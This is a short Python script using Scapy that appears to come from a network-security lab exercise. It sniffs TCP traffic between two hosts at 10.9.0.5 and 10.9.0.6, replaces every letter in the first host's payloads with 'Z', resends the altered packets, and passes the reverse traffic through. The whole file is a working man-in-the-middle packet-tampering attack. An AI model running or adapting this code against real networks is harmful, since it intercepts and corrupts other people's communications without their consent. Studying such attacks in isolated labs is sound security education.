#!/usr/bin/env python3
from scapy.all import *
import re

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"

def intercept(pkt):
	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].payload:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
		
		olddata = pkt[TCP].payload.load
		data = olddata.decode()
		newdata = re.sub(r'[a-zA-Z]',r'Z',data)
		
		send(newpkt/newdata)

	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
		send(pkt[IP])

pkt = sniff(iface='eth0', filter='tcp', prn=intercept)

